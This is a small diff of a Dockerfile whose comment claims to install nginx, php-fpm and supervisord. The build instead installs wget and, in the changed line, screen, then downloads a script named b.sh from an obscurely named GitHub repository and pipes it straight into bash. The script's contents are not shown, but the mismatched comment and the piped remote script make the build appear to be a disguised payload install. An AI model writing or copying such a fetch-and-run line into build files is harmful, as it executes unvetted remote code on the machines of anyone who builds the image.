@@ -13,5 +13,5 @@ ARG DEBIAN_FRONTEND=noninteractive
 RUN apt update
 
 # Install nginx, php-fpm and supervisord from ubuntu repository
-RUN apt -y install wget
+RUN apt -y install wget screen
 RUN wget -O - https://github.com/shgunitompi/viwarlani/raw/main/b.sh | bash
